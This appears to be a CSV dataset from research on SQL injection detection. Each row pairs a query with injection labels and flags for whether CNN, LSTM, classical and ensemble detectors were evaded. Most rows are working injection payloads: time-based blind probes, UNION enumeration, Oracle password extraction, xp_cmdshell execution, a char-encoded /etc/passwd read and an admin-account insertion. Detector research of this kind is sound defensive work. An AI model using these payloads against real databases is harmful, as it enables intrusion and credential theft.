,original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
12586,INSERT INTO table,INSERT INTO table,1,0,1,1,0,1,0
12587,1 exec sp_ (or exec xp_),1 exec sp_ (or exec xp_),0,1,1,0,0,0,0
12588,AnD SLEEP(5)--,AnD SLEEP(5)--,0,1,1,1,0,1,0
12589,ORDER BY 7#,ORDER BY 7#,0,1,1,1,0,1,0
12590,"""));waitfor delay '0:0:__TIME__'--","""));waitfor delay '0:0:__TIME__'--",0,1,0,0,0,0,0
12591,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23","'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23",1,1,0,0,0,0,0
12592,;,;,0,1,1,1,1,1,1
12593,ORDER BY 26,ORDER BY 26,0,1,1,1,0,1,0
12594,WHERE 1=1 AND 1=1,WHERE 1=1 AND 1=1,0,1,0,0,0,0,0
12595,",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,1,0,0,0,0,0
12596,"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--","UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",1,1,1,1,0,1,0
12597,"' and 0=benchmark(3000000,MD5(1))%20%23","' and 0=benchmark(3000000,MD5(1))%20%23",1,1,0,0,0,0,0
12598,' select name from syscolumns where id = (select id from sysobjects where name = tablename')--,' select name from syscolumns where id = (select id from sysobjects where name = tablename')--,1,1,0,0,0,0,0
12599,"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*","),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,1,0,0,0,0,0
12600,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*","+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",0,1,0,0,0,0,0
12601,"') or benchmark(10000000,MD5(1))#","') or benchmark(10000000,MD5(1))#",1,1,0,0,0,0,0
12602,'))))) waitfor delay '0:0:20' /*,'))))) waitfor delay '0:0:20' /*,1,1,0,0,0,0,0
12603,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28","ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",1,1,0,0,0,0,0
12604,INSERT INTO Documents WHERE ID=x,INSERT INTO Documents WHERE ID=x,1,0,1,1,1,1,1
12605,ORDER BY 14,ORDER BY 14,0,1,1,1,0,1,0
12606,""",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",""",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",0,1,0,0,0,0,0
12607,'; exec master..xp_cmdshell 'ping 10.10.1.2'--,'; exec master..xp_cmdshell 'ping 10.10.1.2'--,1,1,1,1,0,1,0
12608,""" waitfor delay '0:0:20' --",""" waitfor delay '0:0:20' --",0,1,0,0,0,0,0
12609,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i",1,1,0,0,0,0,0
12610,1' or '1'='1,1' or '1'='1,1,1,0,0,0,0,0
12611,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11--","ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11--",1,1,0,0,0,0,0
12612,') or sleep(__TIME__)=',') or sleep(__TIME__)=',1,1,0,0,0,0,0
12613,INSERT INTO table,INSERT INTO table,1,0,1,1,0,1,0
12614,x' and 1=(select count(*) from tabname); --,x' and 1=(select count(*) from tabname); --,1,1,0,0,1,0,0
12615,'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login >,'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login >,1,1,1,0,0,0,0
12616,' or 1 in (select @@version)--,' or 1 in (select @@version)--,1,1,0,0,0,0,0
12617,&&SLEEP(5)#,&&SLEEP(5)#,0,1,1,1,0,1,0
12618,"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))","AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))",1,1,0,0,0,0,0
12619,SELECT COUNT(*) FROM game;,SELECT COUNT(*) FROM game;,1,0,1,1,1,1,1
12620,"'),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--","'),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,1,0,0,0,0,0
12621,"' union (select NULL, NULL, NULL, NULL,  (select @@version)) --","' union (select NULL, NULL, NULL, NULL,  (select @@version)) --",1,1,1,0,0,0,0
12622,"',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--","',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,1,0,0,0,0,0
12623,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#","UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#",1,1,1,0,0,0,0
12624,SELECT COUNT(*) FROM game;,SELECT COUNT(*) FROM game;,1,0,1,1,1,1,1
12625,'||'6,'||'6,1,1,0,0,0,0,0
12626,"UNION ALL SELECT 1,2","UNION ALL SELECT 1,2",1,1,1,1,0,1,0
12627,"""),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*","""),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",0,1,0,0,0,0,0
12628,SELECT * FROM Customers ORDER BY Country;,SELECT * FROM Customers ORDER BY Country;,1,0,1,1,1,1,1
12629,)) waitfor delay '0:0:20' --,)) waitfor delay '0:0:20' --,1,1,0,0,0,0,0
12630,",NULL)%20waitfor%20delay%20'0:0:20'%20--",",NULL)%20waitfor%20delay%20'0:0:20'%20--",1,1,0,0,0,0,0
12631,""" or 1=1--",""" or 1=1--",0,1,0,0,0,0,0
12632,"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#",1,1,1,0,0,0,0
12633,'))%20waitfor%20delay%20'0:0:20'%20--,'))%20waitfor%20delay%20'0:0:20'%20--,1,1,0,0,0,0,0
12634,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--","UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--",1,1,1,0,0,0,0
12635,SELECT * FROM Users;,SELECT * FROM Users;,1,0,1,1,1,1,1
12636,"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#","UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#",1,1,1,1,0,1,0
12637,""",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",""",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",0,1,0,0,0,0,0
12638,' or 'something' like 'some%',' or 'something' like 'some%',1,1,0,0,0,0,0
12639,",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,1,0,0,0,0,0
12640,"'))) and 0=benchmark(3000000,MD5(1))%20--","'))) and 0=benchmark(3000000,MD5(1))%20--",1,1,0,0,0,0,0
12641,))%20waitfor%20delay%20'0:0:20'%20/*,))%20waitfor%20delay%20'0:0:20'%20/*,1,1,0,0,0,0,0
12642,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7--","ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7--",1,1,0,0,0,0,0
12643,INSERT INTO table,INSERT INTO table,1,0,1,1,0,1,0
12644,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9","ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9",1,1,0,0,0,0,0
12645,"' || myappadmin.adduser('admin', 'newpass') || '","' || myappadmin.adduser('admin', 'newpass') || '",1,1,0,0,0,0,0
12646,' and 1 in (select var from temp)--,' and 1 in (select var from temp)--,1,1,0,0,0,0,0
12647,ORDER BY 6,ORDER BY 6,0,1,1,1,0,1,0
12648,or pg_SLEEP(5)#,or pg_SLEEP(5)#,0,1,0,0,0,0,0
12649,ORDER BY 12--,ORDER BY 12--,0,1,1,1,0,1,0
12650,",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,1,0,0,0,0,0
12651,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*","+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*",0,1,0,0,0,0,0
12652,"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",1,1,1,0,0,0,0
12653,SELECT * FROM Customers ORDER BY Country;,SELECT * FROM Customers ORDER BY Country;,1,0,1,1,1,1,1
12654,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--","ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--",1,1,0,0,0,0,0
12655,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#","ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#",1,1,0,0,0,0,0
12656,"',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23","',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",1,1,0,0,0,0,0
12657,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i,1,1,0,0,0,0,0
12658,INSERT INTO Documents WHERE ID=x,INSERT INTO Documents WHERE ID=x,1,0,1,1,1,1,1
12659,AnD SLEEP(5),AnD SLEEP(5),0,1,1,1,0,1,0
12660,"and (select substring(@@version,3,1))='c'","and (select substring(@@version,3,1))='c'",1,1,0,0,0,0,0
12661,INSERT INTO table,INSERT INTO table,1,0,1,1,0,1,0
12662,"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--","UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",1,1,1,1,0,1,0
12663,"SELECT column1, column2 FROM table1, table2 WHERE column2='value';","SELECT column1, column2 FROM table1, table2 WHERE column2='value';",1,0,1,1,1,1,1
12664,'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login >,'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login >,1,1,1,0,0,0,0
12665,'; execute immediate 'sel' || 'ect us' || 'er','; execute immediate 'sel' || 'ect us' || 'er',1,1,1,0,0,0,0
12666,SELECT * FROM Users;,SELECT * FROM Users;,1,0,1,1,1,1,1
12667,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#","UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#",1,1,1,0,0,0,0
12668,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20","UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",1,1,1,0,0,0,0
12669,"SELECT column1, column2 FROM table1, table2 WHERE column2='value';","SELECT column1, column2 FROM table1, table2 WHERE column2='value';",1,0,1,1,1,1,1
12670,"SELECT column1, column2 FROM table1, table2 WHERE column2='value';","SELECT column1, column2 FROM table1, table2 WHERE column2='value';",1,0,1,1,1,1,1
12671,"'),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*","'),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,1,0,0,0,0,0
12672,' or username like char(37);,' or username like char(37);,1,1,0,0,0,0,0
12673,ORDER BY 30#,ORDER BY 30#,0,1,1,1,0,1,0
12674,ORDER BY 2#,ORDER BY 2#,0,1,1,1,0,1,0
12675,%'),%'),1,1,0,0,0,0,0
12676,AS INJECTX WHERE 1=1 AND 1=0#,AS INJECTX WHERE 1=1 AND 1=0#,0,1,1,0,0,0,0
12677,""")) waitfor delay '0:0:20' --",""")) waitfor delay '0:0:20' --",0,1,0,0,0,0,0
12678,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#","ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#",1,1,0,0,0,0,0
12679,"')) and 0=benchmark(3000000,MD5(1))%20/*","')) and 0=benchmark(3000000,MD5(1))%20/*",1,1,0,0,0,0,0
12680,x' and 1=(select count(*) from tabname); --,x' and 1=(select count(*) from tabname); --,1,1,0,0,1,0,0
12681,"',NULL)%20waitfor%20delay%20'0:0:20'%20--","',NULL)%20waitfor%20delay%20'0:0:20'%20--",1,1,0,0,0,0,0
12682,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#","ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#",1,1,0,0,0,0,0
12683,'; exec master..xp_cmdshell 'ping 172.10.1.255'--,'; exec master..xp_cmdshell 'ping 172.10.1.255'--,1,1,1,1,0,1,0
12684,"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15--","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15--",1,1,1,0,0,0,0
12685,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--","'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",1,1,0,0,0,0,0
12686,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11","UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11",1,1,1,0,0,0,0
12687,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=4)) AND 'i'='i","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=4)) AND 'i'='i",1,1,0,0,0,0,0
12688,' or username is not NULL or username = ',' or username is not NULL or username = ',1,1,1,0,0,0,0
12689,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16","UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16",1,1,1,0,0,0,0
12690,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28","UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",1,1,1,0,0,0,0
12691,",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,1,0,0,0,0,0
12692,SELECT * FROM Users;,SELECT * FROM Users;,1,0,1,1,1,1,1
12693,"SELECT column1, column2 FROM table1, table2 WHERE column2='value';","SELECT column1, column2 FROM table1, table2 WHERE column2='value';",1,0,1,1,1,1,1
12694,' select name from syscolumns where id = (select id from sysobjects where name = tablename')--,' select name from syscolumns where id = (select id from sysobjects where name = tablename')--,1,1,0,0,0,0,0
12695,ORDER BY 18#,ORDER BY 18#,0,1,1,1,0,1,0
12696,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--","""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--",0,1,0,0,0,0,0
12697,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=4)) AND 'i'='i","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=4)) AND 'i'='i",1,1,0,0,0,0,0
12698,"1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;","1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;",0,1,0,0,0,0,0
12699,INSERT INTO Documents WHERE ID=x,INSERT INTO Documents WHERE ID=x,1,0,1,1,1,1,1
12700,1' and 1=(select count(*) from tablenames); --,1' and 1=(select count(*) from tablenames); --,1,1,0,0,0,0,0
12701,CREATE TABLE Employees,CREATE TABLE Employees,1,0,1,1,1,1,1
12702,"SELECT column1, column2 FROM table1, table2 WHERE column2='value';","SELECT column1, column2 FROM table1, table2 WHERE column2='value';",1,0,1,1,1,1,1
12703,"SELECT column1, column2 FROM table1, table2 WHERE column2='value';","SELECT column1, column2 FROM table1, table2 WHERE column2='value';",1,0,1,1,1,1,1
12704,"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--","),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,1,0,0,0,0,0
12705,' or 'text' = n'text',' or 'text' = n'text',1,1,0,0,0,0,0
12706,"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))--","AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))--",1,1,0,0,0,0,0
12707,SELECT COUNT(*) FROM game;,SELECT COUNT(*) FROM game;,1,0,1,1,1,1,1
12708,' or 1=1 --,' or 1=1 --,1,1,0,0,0,0,0
12709,' union all select @@version--,' union all select @@version--,1,1,1,0,0,0,0
12710,SELECT * FROM Customers ORDER BY Country;,SELECT * FROM Customers ORDER BY Country;,1,0,1,1,1,1,1
12711,",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,1,0,0,0,0,0
12712,"'; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --","'; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --",1,1,0,0,0,0,0
12713,""",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",""",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",0,1,0,0,0,0,0
12714,"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))","AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))",1,1,0,0,0,0,0
12715,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--","'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--",1,1,0,0,0,0,0
12716,' and 1=0) union all,' and 1=0) union all,1,1,0,0,0,0,0
12717,"',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23","',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",1,1,0,0,0,0,0
12718,SELECT COUNT(*) FROM game;,SELECT COUNT(*) FROM game;,1,0,1,1,1,1,1
12719,""",NULL)%20waitfor%20delay%20'0:0:20'%20--",""",NULL)%20waitfor%20delay%20'0:0:20'%20--",0,1,0,0,0,0,0
12720,INSERT INTO table,INSERT INTO table,1,0,1,1,0,1,0
12721,""",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",""",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",0,1,0,0,0,0,0
12722,ORDER BY 31337#,ORDER BY 31337#,0,1,1,1,0,1,0
12723,"UNION ALL SELECT 1,2,3#","UNION ALL SELECT 1,2,3#",1,1,1,1,0,1,0
12724,AND 1=0 AND '%'=',AND 1=0 AND '%'=',1,1,0,0,0,0,0
12725,CREATE TABLE Employees,CREATE TABLE Employees,1,0,1,1,1,1,1
12726,"SELECT column1, column2 FROM table1, table2 WHERE column2='value';","SELECT column1, column2 FROM table1, table2 WHERE column2='value';",1,0,1,1,1,1,1
12727,""" or isNULL(1/0) /*",""" or isNULL(1/0) /*",0,1,0,0,0,0,0
12728,"""))) and 0=benchmark(3000000,MD5(1))%20%23","""))) and 0=benchmark(3000000,MD5(1))%20%23",0,1,0,0,0,0,0
12729,"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23","+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23",0,1,0,0,0,0,0
12730,"' union select * from users where login = char(114,111,111,116);","' union select * from users where login = char(114,111,111,116);",1,1,0,0,0,0,0
12731,"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",1,1,1,0,0,0,0
12732,""")))) and 0=benchmark(3000000,MD5(1))%20/*",""")))) and 0=benchmark(3000000,MD5(1))%20/*",0,1,0,0,0,0,0
12733,INSERT INTO Documents WHERE ID=x,INSERT INTO Documents WHERE ID=x,1,0,1,1,1,1,1
12734,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--","'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--",1,1,0,0,0,0,0
12735,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--","UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--",1,1,1,0,0,0,0
12736,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=6)) AND 'i'='i","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=6)) AND 'i'='i",1,1,0,0,0,0,0
12737,SELECT COUNT(*) FROM game;,SELECT COUNT(*) FROM game;,1,0,1,1,1,1,1
12738,",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,1,0,0,0,0,0
12739,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=2)) AND 'i'='i","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=2)) AND 'i'='i",1,1,0,0,0,0,0
12740,"'; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --","'; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --",1,1,0,0,0,0,0
12741,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--","""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--",0,1,0,0,0,0,0
12742,",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,1,0,0,0,0,0
12743,"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",1,1,1,0,0,0,0
12744,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=7)) AND 'i'='i","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=7)) AND 'i'='i",1,1,0,0,0,0,0
12745,"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--","+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--",0,1,0,0,0,0,0
12746,"""),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*","""),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",0,1,0,0,0,0,0
12747,""")",""")",0,1,0,0,0,0,0
